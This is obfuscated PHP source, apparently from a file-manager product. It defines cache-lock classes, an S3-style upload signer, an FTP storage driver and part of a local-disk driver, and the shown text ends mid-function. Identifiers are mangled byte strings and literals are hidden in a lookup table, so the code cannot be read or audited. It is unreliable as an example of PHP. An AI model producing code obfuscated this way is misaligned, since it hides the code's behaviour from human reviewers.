<?php
 goto c½¸¨Š‡íÀ; Cö•‰Úˆ: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $¸ÜÙŒ¾ =& $_SERVER[şÒÁøÒÄ]; $Ôã˜şíê = $GLOBALS[$¸ÜÙŒ¾[6]][$¸ÜÙŒ¾[349]]; self::$cachePath = $Ôã˜şíê[$¸ÜÙŒ¾[200]][$¸ÜÙŒ¾[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($Ğª¡Á¶¼, $ıÙ´•¢ = 0) { $æ¬ó¡Êô =& $_SERVER[şÒÁøÒÄ]; $¨¤œ«°Ü = microtime(!0); $»ŒÎæ = $¨¤œ«°Ü + $ıÙ´•¢ + 0.0001; $î¦¶¸„ç = rtrim(self::$cachePath, $æ¬ó¡Êô[8]) . $æ¬ó¡Êô[871] . md5($Ğª¡Á¶¼) . $æ¬ó¡Êô[868]; if (file_exists($î¦¶¸„ç) && filemtime($î¦¶¸„ç) && filemtime($î¦¶¸„ç) < time() - 10) { @unlink($î¦¶¸„ç); } do { if (file_exists($î¦¶¸„ç)) { cacheLockWait(); continue; } $„ïŠ²‘Å = fopen($î¦¶¸„ç, $æ¬ó¡Êô[872]); if (!$„ïŠ²‘Å) { return !1; } $¹–§ò´ = flock($„ïŠ²‘Å, LOCK_EX | LOCK_NB); self::$caches[$Ğª¡Á¶¼] = array($æ¬ó¡Êô[873] => $„ïŠ²‘Å, $æ¬ó¡Êô[200] => $î¦¶¸„ç); fwrite($„ïŠ²‘Å, $»ŒÎæ); clearstatcache(); if ($„ïŠ²‘Å && $¹–§ò´) { return !0; } cacheLockWait(); } while (microtime(!0) < $»ŒÎæ); $this->unlock($Ğª¡Á¶¼); return !1; } public function lockGet($‹š‘Ü¸‹) { $ÌñÌöÇŒ =& $_SERVER[şÒÁøÒÄ]; $ÏåÑŞºî = rtrim(self::$cachePath, $ÌñÌöÇŒ[8]) . $ÌñÌöÇŒ[871] . md5($‹š‘Ü¸‹) . $ÌñÌöÇŒ[868]; return file_exists($ÏåÑŞºî); } public function unlock($¡â¦ú ñ) { $¡±°Ä‚„ =& $_SERVER[şÒÁøÒÄ]; $†½¼‹Ğì = self::$caches[$¡â¦ú ñ]; if (!$†½¼‹Ğì) { return; } @flock($†½¼‹Ğì[$¡±°Ä‚„[873]], LOCK_UN); @fclose($†½¼‹Ğì[$¡±°Ä‚„[873]]); @unlink($†½¼‹Ğì[$¡±°Ä‚„[200]]); unset(self::$caches[$¡â¦ú ñ]); } } class CacheLockRedis { public function lock($óäôáª¹, $÷ÅíÎñ = 10) { $™¬ªĞı¨ = Cache::init(); $´ş­¼ë = microtime(!0) + $÷ÅíÎñ; while (microtime(!0) < $´ş­¼ë) { $“û°ÊŞ = $™¬ªĞı¨->get($óäôáª¹); if (!$“û°ÊŞ) { $íÃš•òÂ = $™¬ªĞı¨->setLock($óäôáª¹, $´ş­¼ë, $÷ÅíÎñ); if ($íÃš•òÂ) { return !0; } } else { if ($“û°ÊŞ < microtime(!0)) { $™¬ªĞı¨->set($óäôáª¹, $´ş­¼ë, $÷ÅíÎñ * 2); if ($™¬ªĞı¨->get($óäôáª¹) === $“û°ÊŞ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($è¿Ú¥ÑÛ) { return Cache::init()->get($è¿Ú¥ÑÛ); } public function unlock($î“®ª×£) { return Cache::init()->remove($î“®ª×£); } } goto AÏÑê®âñ“; E¼–´ó”Ù¾: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($…­îãì) { parent::__construct($…­îãì); $this->signatureVersion($_SERVER[şÒÁøÒÄ][216]); } public function uploadFormData($ğ©šâÒ, $×¡×ŒÚ¢ = 3600) { $óÛ½Øê =& $_SERVER[şÒÁøÒÄ]; $ÚË²¥æ“ = $óÛ½Øê[199]; $ñ¹­Òª÷ = $óÛ½Øê[1373]; $õ·›ß© = $óÛ½Øê[62]; $¤ÑÑôØÈ = gmdate($óÛ½Øê[1374]); $“°÷õÛ» = gmdate($óÛ½Øê[758]); $®ƒ­Šñ¨ = $óÛ½Øê[1375]; $ÙıãóÁº = $×¡×ŒÚ¢ . $óÛ½Øê[12]; $™¡˜˜Á = $óÛ½Øê[1335]; $ÊÊ¬ÃÃ˜ = array($this->accessKey, $“°÷õÛ», $this->region, $õ·›ß©, $®ƒ­Šñ¨); $ÉÂßŒ„ı = implode($óÛ½Øê[8], $ÊÊ¬ÃÃ˜); $™¦ÓÕĞ¦ = array($óÛ½Øê[1337] => gmdate($óÛ½Øê[1336], strtotime($óÛ½Øê[1376])), $óÛ½Øê[1338] => array(array($óÛ½Øê[1340] => $this->bucket), array($óÛ½Øê[1339] => $ÚË²¥æ“), array($óÛ½Øê[1341], $óÛ½Øê[1342], $óÛ½Øê[12]), array($óÛ½Øê[1341], $óÛ½Øê[1377], $óÛ½Øê[12]), array($óÛ½Øê[1341], $óÛ½Øê[1378], $óÛ½Øê[12]), array($óÛ½Øê[1343] => $™¡˜˜Á), array($óÛ½Øê[1379] => $ÉÂßŒ„ı), array($óÛ½Øê[1380] => $ñ¹­Òª÷), array($óÛ½Øê[1381] => $¤ÑÑôØÈ), array($óÛ½Øê[1382] => $ÙıãóÁº))); $òĞÃØ = base64_encode(json_encode($™¦ÓÕĞ¦)); $Š¸õ¤³½ = hash_hmac($óÛ½Øê[1383], $“°÷õÛ», $óÛ½Øê[1384] . $this->secret, !0); $éá¾âÂ– = hash_hmac($óÛ½Øê[1383], $this->region, $Š¸õ¤³½, !0); $ˆ¢¾€ÒÕ = hash_hmac($óÛ½Øê[1383], $õ·›ß©, $éá¾âÂ–, !0); $¦ãï÷™× = hash_hmac($óÛ½Øê[1383], $®ƒ­Šñ¨, $ˆ¢¾€ÒÕ, !0); $©Îş‘ûÏ = hash_hmac($óÛ½Øê[1383], $òĞÃØ, $¦ãï÷™×); $ªı¾¦Ïˆ = array($óÛ½Øê[215] => $óÛ½Øê[12], $óÛ½Øê[1385] => $óÛ½Øê[12], $óÛ½Øê[1339] => $ÚË²¥æ“, $óÛ½Øê[1343] => $™¡˜˜Á, $óÛ½Øê[1347] => $òĞÃØ, $óÛ½Øê[1386] => $ÉÂßŒ„ı, $óÛ½Øê[1387] => $ñ¹­Òª÷, $óÛ½Øê[1388] => $¤ÑÑôØÈ, $óÛ½Øê[1389] => $ÙıãóÁº, $óÛ½Øê[1390] => $©Îş‘ûÏ, $óÛ½Øê[182] => $this->getHost()); return $ªı¾¦Ïˆ; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($À³Àä—) { parent::__construct(); if (count($À³Àä—) > 0) { $this->_init($À³Àä—); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($Äü®å®ç) { $‚ıÓıûë =& $_SERVER[şÒÁøÒÄ]; global $config; $this->appCharset = $config[$‚ıÓıûë[1391]]; $this->systemCharset = $config[$‚ıÓıûë[1392]]; if (isset($Äü®å®ç[$‚ıÓıûë[1393]]) && $Äü®å®ç[$‚ıÓıûë[1393]]) { $this->systemCharset = $Äü®å®ç[$‚ıÓıûë[1393]]; } } public function iconvApp($‰ŞìÙˆõ) { return $this->iconvTo($‰ŞìÙˆõ, $this->systemCharset, $this->appCharset); } public function iconvSystem($š¯‰ÎñÎ) { return $this->iconvTo($š¯‰ÎñÎ, $this->appCharset, $this->systemCharset); } public function getPathOuter($Çœš“ı) { $Ñ¥Ïæñá =& $_SERVER[şÒÁøÒÄ]; $Ãí¹ÖÉ· = $this->iconvApp($this->pathBase); $Çœš“ı = $this->iconvApp($Çœš“ı); if (substr($Ãí¹ÖÉ·, 0, 2) == $Ñ¥Ïæñá[1394]) { $Ãí¹ÖÉ· = BASIC_PATH . substr($Ãí¹ÖÉ·, 2); } if (substr($Çœš“ı, 0, 2) == $Ñ¥Ïæñá[1394]) { $Çœš“ı = BASIC_PATH . substr($Çœš“ı, 2); } $Ãí¹ÖÉ· = KodIO::clear($Ãí¹ÖÉ·); $Çœš“ı = KodIO::clear($Çœš“ı); $Çœš“ı = substr($Çœš“ı, strlen($Ãí¹ÖÉ·)); if (empty($this->pathDriver)) { return $Çœš“ı; } return $this->pathDriver . $Ñ¥Ïæñá[8] . ltrim($Çœš“ı, $Ñ¥Ïæñá[8]); } private function _init($°êŞ—Ùü = array()) { $İ¢ôÊÃ =& $_SERVER[şÒÁøÒÄ]; if (!function_exists($İ¢ôÊÃ[1395])) { throw new Exception(LNG($İ¢ôÊÃ[1396])); } $this->config = $°êŞ—Ùü; $this->charsetReset($°êŞ—Ùü); foreach ($°êŞ—Ùü as $»ØªâÑ¥ => $à¤ñÉ¬±) { if (isset($this->{$»ØªâÑ¥})) { $this->{$»ØªâÑ¥} = $à¤ñÉ¬±; } } return $this->_login($°êŞ—Ùü); } private function _login($Â¸ÉåÍİ) { $÷ğá§»Ï =& $_SERVER[şÒÁøÒÄ]; static $àã¾šùˆ = array(); $Şã‚ê¦È = md5(json_encode($Â¸ÉåÍİ)); if (isset($àã¾šùˆ[$Şã‚ê¦È])) { foreach ($àã¾šùˆ[$Şã‚ê¦È] as $–²¹áµ => $ñÄêÎ˜º) { $this->{$–²¹áµ} = $ñÄêÎ˜º; } return !0; } $Ñ®÷Áè‡ = parse_url(trim($this->server, $÷ğá§»Ï[8])); $this->host = $Ñ®÷Áè‡[$÷ğá§»Ï[182]]; $Šı¤ÕÍÆ = isset($Ñ®÷Áè‡[$÷ğá§»Ï[181]]) && $Ñ®÷Áè‡[$÷ğá§»Ï[181]] == $÷ğá§»Ï[1397] ? !0 : !1; $this->scheme = $Šı¤ÕÍÆ ? $÷ğá§»Ï[1398] : $÷ğá§»Ï[1399]; $this->port = isset($Ñ®÷Áè‡[$÷ğá§»Ï[183]]) ? $Ñ®÷Áè‡[$÷ğá§»Ï[183]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $»ïºş£Ä = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $üÂàå…· = $this->pasv == $÷ğá§»Ï[88] ? !0 : !1; @ftp_pasv($this->connect, $üÂàå…·); $àã¾šùˆ[$Şã‚ê¦È] = array($÷ğá§»Ï[1400] => $this->connect, $÷ğá§»Ï[182] => $this->host, $÷ğá§»Ï[181] => $this->scheme, $÷ğá§»Ï[183] => $this->port); return $»ïºş£Ä; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($¬¶ Û¼‡, $–”½ÇµÏ = '', $¤«›üñá = REPEAT_RENAME) { if ($this->setContent($¬¶ Û¼‡, $–”½ÇµÏ)) { return $this->getPathOuter($¬¶ Û¼‡); } return !1; } public function mkdir($íÚ˜Ñıò, $ê¢Ö¾×´ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $íÚ˜Ñıò = $this->iconvSystem($íÚ˜Ñıò); if ($this->_isFolder($íÚ˜Ñıò) || @ftp_mkdir($this->connect, $íÚ˜Ñıò)) { return $this->getPathOuter($íÚ˜Ñıò); } if (!$this->mkdir($this->pathFather($íÚ˜Ñıò))) { return !1; } if ($íÚ˜Ñıò = @ftp_mkdir($this->connect, $íÚ˜Ñıò)) { return $this->getPathOuter($íÚ˜Ñıò); } return !1; } public function copyFile($“¨É«Ôô, $ª¿ˆ˜²Ò) { if (!$this->_isconn()) { return !1; } $¿Ã¨çÓ = $this->pathThis($this->iconvSystem($“¨É«Ôô)); $À¡Ó¸… = $this->tempFile($¿Ã¨çÓ); $ª€áº— = $this->iconvApp($À¡Ó¸…); $this->download($“¨É«Ôô, $ª€áº—); $÷ÀÏÔ¸ı = $this->upload($ª¿ˆ˜²Ò, $ª€áº—); $this->tempFileRemve($À¡Ó¸…); return $÷ÀÏÔ¸ı; } public function moveFile($¯Å’ÅÄ», $ò„«…ı) { if (!$this->_isconn()) { return !1; } $¯Å’ÅÄ» = $this->iconvSystem($¯Å’ÅÄ»); $ò„«…ı = $this->iconvSystem($ò„«…ı); $ßÁŸòª« = @ftp_rename($this->connect, $¯Å’ÅÄ», $ò„«…ı); return $ßÁŸòª« ? $this->getPathOuter($ò„«…ı) : !1; } public function delFile($¤°Åç£) { if (!$this->_isconn()) { return !1; } $¤°Åç£ = $this->iconvSystem($¤°Åç£); return @ftp_delete($this->connect, $¤°Åç£); } public function delFolder($®“á ŒÇ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $‰ÃÃå­„ = $ ìïÑ¸à = array(); $this->fileList($®“á ŒÇ, $‰ÃÃå­„, $ ìïÑ¸à, !0); $this->listItemCache = !0; foreach ($ ìïÑ¸à as $ç² óÆæ) { $ññµŒã = $this->iconvSystem($ç² óÆæ[$_SERVER[şÒÁøÒÄ][32]]); $¢ö¼‰àŞ = @ftp_delete($this->connect, $ññµŒã); if (!$¢ö¼‰àŞ) { return !1; } } foreach ($‰ÃÃå­„ as $ññµŒã) { $ññµŒã = $this->iconvSystem($ññµŒã); $¢ö¼‰àŞ = @ftp_rmdir($this->connect, $ññµŒã); if (!$¢ö¼‰àŞ) { return !1; } } $®“á ŒÇ = $this->iconvSystem($®“á ŒÇ); return @ftp_rmdir($this->connect, $®“á ŒÇ); } public function rename($ÈÍÍşË, $ü¡ò· Ú) { $ÖªÔŠì =& $_SERVER[şÒÁøÒÄ]; if (!$this->_isconn()) { return !1; } $¦£…‹¡¨ = $this->fileNameAuto($this->pathFather($ÈÍÍşË), $ü¡ò· Ú); $¦£…‹¡¨ = $this->iconvSystem($¦£…‹¡¨); $ÈÍÍşË = $this->iconvSystem($ÈÍÍşË); $¹æÜù‹‰ = $this->pathFather($ÈÍÍşË); $ïä˜ù = rtrim($¹æÜù‹‰, $ÖªÔŠì[8]) . $ÖªÔŠì[8] . $¦£…‹¡¨; $œÓÄŠõ = @ftp_rename($this->connect, $ÈÍÍşË, $ïä˜ù); $ïä˜ù = $this->iconvApp($ïä˜ù); return $œÓÄŠõ ? $this->getPathOuter($ïä˜ù) : !1; } private function folderInfo($„Ü¤´ò¦, $Æ«ÙÀö = false) { $ê€æ±å€ =& $_SERVER[şÒÁøÒÄ]; $–çªÀšÙ = array($ê€æ±å€[32] => $this->pathThis($„Ü¤´ò¦), $ê€æ±å€[84] => $this->getPathOuter($ê€æ±å€[8] . $„Ü¤´ò¦), $ê€æ±å€[33] => $ê€æ±å€[75]); if ($Æ«ÙÀö) { return $–çªÀšÙ; } $–çªÀšÙ[$ê€æ±å€[201]] = $–çªÀšÙ[$ê€æ±å€[85]] = 0; $–çªÀšÙ[$ê€æ±å€[202]] = $–çªÀšÙ[$ê€æ±å€[203]] = !0; return $–çªÀšÙ; } private function fileInfo($Ã©æµÜ, $ŒÛÌ´Í´ = false, $ÑïØÕÆé = array()) { $„ªÀü•å =& $_SERVER[şÒÁøÒÄ]; $’‹ú³Ù = array($„ªÀü•å[32] => $this->pathThis($Ã©æµÜ), $„ªÀü•å[84] => $this->getPathOuter($„ªÀü•å[8] . $Ã©æµÜ), $„ªÀü•å[33] => $„ªÀü•å[200], $„ªÀü•å[76] => isset($ÑïØÕÆé[$„ªÀü•å[76]]) ? $ÑïØÕÆé[$„ªÀü•å[76]] : 0, $„ªÀü•å[174] => $this->ext($Ã©æµÜ)); if ($ŒÛÌ´Í´) { return $’‹ú³Ù; } $’‹ú³Ù[$„ªÀü•å[201]] = $’‹ú³Ù[$„ªÀü•å[85]] = 0; $’‹ú³Ù[$„ªÀü•å[202]] = $’‹ú³Ù[$„ªÀü•å[203]] = !0; $¢”ìØ¸ = $this->iconvSystem($Ã©æµÜ); $’‹ú³Ù[$„ªÀü•å[85]] = @ftp_mdtm($this->connect, $¢”ìØ¸); if (empty($ÑïØÕÆé)) { $ÑïØÕÆé = $this->objectMeta($Ã©æµÜ); if (!$ÑïØÕÆé) { return $’‹ú³Ù; } } $’‹ú³Ù[$„ªÀü•å[76]] = $ÑïØÕÆé[$„ªÀü•å[76]]; return $’‹ú³Ù; } public function size($¡³şğÏô) { $ŒÏèã³œ = $this->objectMeta($¡³şğÏô); return $ŒÏèã³œ ? $ŒÏèã³œ[$_SERVER[şÒÁøÒÄ][76]] : 0; } public function info($öû©ùà) { if ($this->isFile($öû©ùà)) { return $this->fileInfo($öû©ùà, 0); } else { if ($this->isFolder($öû©ùà)) { return $this->folderInfo($öû©ùà); } } return !1; } private function fileList($÷Äíàï, &$á¨›Îê, &$âÈŠÀÔ“, $Ÿ½Şğ = false) { $»”ñ¨Ùä =& $_SERVER[şÒÁøÒÄ]; $÷Äíàï = $this->iconvSystem($÷Äíàï); if (!$this->isFolder($÷Äíàï)) { return !1; } @ftp_chdir($this->connect, $»”ñ¨Ùä[8]); $÷Äíàï = rtrim($÷Äíàï, $»”ñ¨Ùä[8]) . $»”ñ¨Ùä[8]; check_abort(); $Ù¨º¶ = @ftp_rawlist($this->connect, $÷Äíàï); if (!$Ù¨º¶) { $Ù¨º¶ = array(); } $°ş’Ğ©ë = array($»”ñ¨Ùä[10] => 1, $»”ñ¨Ùä[1401] => 1); foreach ($Ù¨º¶ as $…æ¥ ¥æ) { $¦ÔÇßïö = $this->_listItem($…æ¥ ¥æ); if ($¦ÔÇßïö[0] == $»”ñ¨Ùä[766]) { continue; } $‘ø€çÕ = $¦ÔÇßïö[8]; if (empty($‘ø€çÕ) && $‘ø€çÕ !== $»”ñ¨Ùä[198] || isset($°ş’Ğ©ë[$‘ø€çÕ])) { continue; } $‘ø€çÕ = $this->iconvApp($÷Äíàï . ltrim($‘ø€çÕ, $»”ñ¨Ùä[8])); $Ñé‹‹ö‡ = array($»”ñ¨Ùä[32] => $‘ø€çÕ, $»”ñ¨Ùä[33] => $»”ñ¨Ùä[200], $»”ñ¨Ùä[76] => $¦ÔÇßïö[4]); if (substr($…æ¥ ¥æ, 0, 1) == $»”ñ¨Ùä[1402]) { $Ñé‹‹ö‡[$»”ñ¨Ùä[33]] = $»”ñ¨Ùä[75]; $Ñé‹‹ö‡[$»”ñ¨Ùä[76]] = 0; } $ÌÙ²øÒÍ = $Ñé‹‹ö‡[$»”ñ¨Ùä[33]] == $»”ñ¨Ùä[75] ? !0 : !1; $this->cacheMethodInfoSet($‘ø€çÕ, $ÌÙ²øÒÍ, $Ñé‹‹ö‡); if ($ÌÙ²øÒÍ) { $á¨›Îê[] = $‘ø€çÕ; if ($Ÿ½Şğ) { $this->fileList($‘ø€çÕ, $á¨›Îê, $âÈŠÀÔ“, $Ÿ½Şğ); } continue; } $âÈŠÀÔ“[] = $Ñé‹‹ö‡; } $this->cacheMethodInfoSet($÷Äíàï, !0); } private function _listItem($ÑŒĞç·°) { if (empty($ÑŒĞç·°)) { return array(); } $ßÎ½šæ¢ = preg_split($_SERVER[şÒÁøÒÄ][1403], $ÑŒĞç·°); if (count($ßÎ½šæ¢) <= 9) { return $ßÎ½šæ¢; } $ßÎ½šæ¢[8] = trim(substr($ÑŒĞç·°, strpos($ÑŒĞç·°, $ßÎ½šæ¢[7]) + strlen($ßÎ½šæ¢[7]))); return array_splice($ßÎ½šæ¢, 0, 9); } public function listPath($¡ğ½Ïò, $†ÄöŸ‰’ = false) { $Ù…ªÅÉ™ =& $_SERVER[şÒÁøÒÄ]; if (!$this->_isconn()) { return !1; } $©™°ÍËÄ = $ì”Ìùí = array(); $this->fileList($¡ğ½Ïò, $©™°ÍËÄ, $ì”Ìùí); foreach ($©™°ÍËÄ as $òµõ×¦ğ => $‹Üğ¶ñ) { $©™°ÍËÄ[$òµõ×¦ğ] = $this->folderInfo($‹Üğ¶ñ, $†ÄöŸ‰’); } foreach ($ì”Ìùí as $òµõ×¦ğ => $‹Üğ¶ñ) { $ì”Ìùí[$òµõ×¦ğ] = $this->fileInfo($‹Üğ¶ñ[$Ù…ªÅÉ™[32]], $†ÄöŸ‰’, $‹Üğ¶ñ); } return array($Ù…ªÅÉ™[82] => $©™°ÍËÄ, $Ù…ªÅÉ™[83] => $ì”Ìùí); } public function has($é® “±í, $¨³£ÄÔ = false, $»¯ìÎå = true) { $µ½ôÁú˜ =& $_SERVER[şÒÁøÒÄ]; $¬š°¬ªÄ = $ÉÊ™­Çä = array(); $‡›÷¸¿¨ = $¨³£ÄÔ ? !0 : !1; $this->fileList($é® “±í, $¬š°¬ªÄ, $ÉÊ™­Çä, $‡›÷¸¿¨); if ($¨³£ÄÔ) { return array($µ½ôÁú˜[207] => count($ÉÊ™­Çä), $µ½ôÁú˜[208] => count($¬š°¬ªÄ)); } if ($»¯ìÎå) { if (count($ÉÊ™­Çä)) { return !0; } } else { if (count($¬š°¬ªÄ)) { return !0; } } return !1; } public function listAll($ãáÓì“Ò) { $“¡ŸÕŠÄ =& $_SERVER[şÒÁøÒÄ]; if (!$this->_isconn()) { return !1; } $é¤ú–¹ = $½Àß¿¿ = array(); $this->fileList($ãáÓì“Ò, $é¤ú–¹, $½Àß¿¿, !0); $ã¸ùõåî = array_to_keyvalue($½Àß¿¿, $“¡ŸÕŠÄ[32]); foreach ($é¤ú–¹ as $¥îİÎôç) { if (is_string($¥îİÎôç)) { $ã¸ùõåî[$¥îİÎôç] = array($“¡ŸÕŠÄ[76] => 0); } } return $this->listAllFiles($ãáÓì“Ò, $ã¸ùõåî); } public function getContent($©¡ö¬¹Ö) { if (!$this->_isconn()) { return !1; } $©¡ö¬¹Ö = $this->iconvSystem($©¡ö¬¹Ö); return $this->fileSubstr($©¡ö¬¹Ö); } public function setContent($ÕÈƒ¸úÖ, $×÷¯Ş…ï = '') { if (!$this->_isconn()) { return !1; } $óÏñ¬Áö = $this->pathThis($this->iconvSystem($ÕÈƒ¸úÖ)); $¸¤¶óè¾ = $this->tempFile($óÏñ¬Áö); file_put_contents($¸¤¶óè¾, $×÷¯Ş…ï); $»º‡ß³ = $this->upload($ÕÈƒ¸úÖ, $this->iconvApp($¸¤¶óè¾)); $this->tempFileRemve($¸¤¶óè¾); return $»º‡ß³; } public function fileSubstr($İ‘˜–®ª, $Š·‚Ó = 0, $Ò’ÑªûÌ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($İ‘˜–®ª, $Š·‚Ó, $Ò’ÑªûÌ); } private function ftpRequest($ÉŒô–­Ä, $³Ø±Ç¡è = 0, $ÓÀÖ½Éû = false) { $ÉŒô–­Ä = $this->iconvSystem($ÉŒô–­Ä); $„ì¿êğÈ = $this->scheme . $this->host . $_SERVER[şÒÁøÒÄ][4] . $this->port; $¸ÀÂØ·– = curl_init(); curl_setopt($¸ÀÂØ·–, CURLOPT_URL, $„ì¿êğÈ . $this->pathEncode($ÉŒô–­Ä)); curl_setopt($¸ÀÂØ·–, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($ÓÀÖ½Éû) { $ÍÛ÷Ùì = $³Ø±Ç¡è + $ÓÀÖ½Éû - 1; curl_setopt($¸ÀÂØ·–, CURLOPT_RANGE, "{$³Ø±Ç¡è}\x2d{$ÍÛ÷Ùì}"); } curl_setopt($¸ÀÂØ·–, CURLOPT_RETURNTRANSFER, 1); $á¡ÎÚ»© = curl_exec($¸ÀÂØ·–); curl_close($¸ÀÂØ·–); return $á¡ÎÚ»©; } public function upload($È¸Œ·¥§, $îó‰…Ş, $°›”ãÀÎ = false, $³¥´Í = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($È¸Œ·¥§))) { return !1; } $È¸Œ·¥§ = $this->iconvSystem($È¸Œ·¥§); $îó‰…Ş = $this->iconvSystem($îó‰…Ş); $ôğ«²²™ = ftp_nb_put($this->connect, $È¸Œ·¥§, $îó‰…Ş, FTP_BINARY); while ($ôğ«²²™ == FTP_MOREDATA) { $ôğ«²²™ = ftp_nb_continue($this->connect); } if ($ôğ«²²™ != FTP_FINISHED) { return !1; } return $this->getPathOuter($È¸Œ·¥§); } public function download($•¬Òª©, $µıÈÈˆ£ = '') { if (!$this->_isconn()) { return !1; } $ù®ƒ°ÃÔ = $this->pathFather($µıÈÈˆ£); if (!IO::mkdir($ù®ƒ°ÃÔ)) { return !1; } $•¬Òª© = $this->iconvSystem($•¬Òª©); $µıÈÈˆ£ = $this->iconvSystem($µıÈÈˆ£); $å½œ±¢Û = ftp_nb_get($this->connect, $µıÈÈˆ£, $•¬Òª©, FTP_BINARY); while ($å½œ±¢Û == FTP_MOREDATA) { $å½œ±¢Û = ftp_nb_continue($this->connect); } if ($å½œ±¢Û != FTP_FINISHED) { return !1; } return $this->iconvApp($µıÈÈˆ£); } public function exist($ÛÛ¶çèÏ) { return $this->isFile($ÛÛ¶çèÏ) || $this->isFolder($ÛÛ¶çèÏ); } public function isFile($áÑı×¾‡) { return !$this->isFolder($áÑı×¾‡) && $this->objectMeta($áÑı×¾‡); } public function isFolder($Ô­Š¯™•) { return $this->cacheMethod($_SERVER[şÒÁøÒÄ][165], $Ô­Š¯™•); } protected function objectMeta($‘¶­¾½) { return $this->cacheMethod($_SERVER[şÒÁøÒÄ][167], $‘¶­¾½); } protected function _objectMeta($½³¸ºÛ¸) { $÷˜„«Ô§ =& $_SERVER[şÒÁøÒÄ]; if ($½³¸ºÛ¸ == $÷˜„«Ô§[12] || $½³¸ºÛ¸ == $÷˜„«Ô§[8]) { return array(); } if (!$this->_isconn()) { return !1; } $½³¸ºÛ¸ = $this->iconvSystem($½³¸ºÛ¸); $Ñªâ’é‹ = array($÷˜„«Ô§[32] => $this->iconvApp($½³¸ºÛ¸), $÷˜„«Ô§[33] => $÷˜„«Ô§[200], $÷˜„«Ô§[76] => 0); @ftp_chdir($this->connect, $÷˜„«Ô§[8]); $Ø®…ÒïÁ = @ftp_size($this->connect, $½³¸ºÛ¸); if ($Ø®…ÒïÁ != -1) { $Ñªâ’é‹[$÷˜„«Ô§[76]] = $Ø®…ÒïÁ; } else { $Íà·˜û™ = @ftp_chdir($this->connect, $½³¸ºÛ¸); if (!$Íà·˜û™) { return !1; } $Ñªâ’é‹[$÷˜„«Ô§[33]] = $÷˜„«Ô§[75]; } return $Ñªâ’é‹; } protected function _isFolder($¸Öé”µ¬) { $Ğª¹ú¨¿ =& $_SERVER[şÒÁøÒÄ]; if ($¸Öé”µ¬ == $Ğª¹ú¨¿[12] || $¸Öé”µ¬ == $Ğª¹ú¨¿[8]) { return !0; } $éµ®à¸Ğ = $this->_objectMeta($¸Öé”µ¬); return isset($éµ®à¸Ğ[$Ğª¹ú¨¿[33]]) && $éµ®à¸Ğ[$Ğª¹ú¨¿[33]] == $Ğª¹ú¨¿[75] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($åè‰íÚ¼) { if (substr($åè‰íÚ¼, 0, 2) == $_SERVER[şÒÁøÒÄ][1394]) { $åè‰íÚ¼ = BASIC_PATH . substr($åè‰íÚ¼, 2); } return $åè‰íÚ¼; } public function iconvApp($¼¶­°ÑŠ) { $ô•ŞÈ‹í =& $_SERVER[şÒÁøÒÄ]; global $config; return $this->iconvTo($¼¶­°ÑŠ, $config[$ô•ŞÈ‹í[1392]], $config[$ô•ŞÈ‹í[1391]]); } public function iconvSystem($¶®¼µıò) { $ÊıÌ…†Â =& $_SERVER[şÒÁøÒÄ]; global $config; return $this->iconvTo($¶®¼µıò, $config[$ÊıÌ…†Â[1391]], $config[$ÊıÌ…†Â[1392]]); } public function getPathOuter($¸š•Ùî¯) { $«İâåª =& $_SERVER[şÒÁøÒÄ]; $ÑßÚÔ€Ù = $this->iconvApp($this->pathBase); $¸š•Ùî¯ = $this->iconvApp($¸š•Ùî¯); if (substr($ÑßÚÔ€Ù, 0, 2) == $«İâåª[1394]) { $ÑßÚÔ€Ù = BASIC_PATH . substr($ÑßÚÔ€Ù, 2); } if (substr($¸š•Ùî¯, 0, 2) == $«İâåª[1394]) { $¸š•Ùî¯ = BASIC_PATH . substr($¸š•Ùî¯, 2); } $ÑßÚÔ€Ù = KodIO::clear($ÑßÚÔ€Ù); $¸š•Ùî¯ = KodIO::clear($¸š•Ùî¯); $¸š•Ùî¯ = substr($¸š•Ùî¯, strlen($ÑßÚÔ€Ù)); if (empty($this->pathDriver)) { return $¸š•Ùî¯; } return $this->pathDriver . $«İâåª[8] . ltrim($¸š•Ùî¯, $«İâåª[8]); } public function mkfile($¢àİ„õ÷, $ıŸÎñú‡ = '', $¹ÅíØÔÁ = REPEAT_RENAME) { $¢àİ„õ÷ = $this->iconvSystem($¢àİ„õ÷); @touch($¢àİ„õ÷); if ($ıŸÎñú‡) { file_put_contents($¢àİ„õ÷, $ıŸÎñú‡); } @chmod($¢àİ„õ÷, $this->pathAuth); return is_file($¢àİ„õ÷) ? $this->getPathOuter($¢àİ„õ÷) : !1; } public function mkdir($£Ø¬Æå¼, $Óğ¶ó‹¦ = REPEAT_SKIP) { $£Ø¬Æå¼ = $this->iconvSystem($£Ø¬Æå¼); if (is_dir($£Ø¬Æå¼)) { return $this->getPathOuter($£Ø¬Æå¼); } @mkdir($£Ø¬Æå¼, $this->pathAuth, !0); @chmod($£Ø¬Æå¼, $this->pathAuth); return is_dir($£Ø¬Æå¼) ? $this->getPathOuter($£Ø¬Æå¼) : !1; } public function copyFile($’êßô’Ç, $Ğñ¦—†°) { $this->mkdir($this->pathFather($Ğñ¦—†°)); $’êßô’Ç = $this->iconvSystem($’êßô’Ç); $Ğñ¦—†° = $this->iconvSystem($Ğñ¦—†°); $şãÏèª’ = copy_64($’êßô’Ç, $Ğñ¦—†°); @chmod($Ğñ¦—†°, $this->pathAuth); return 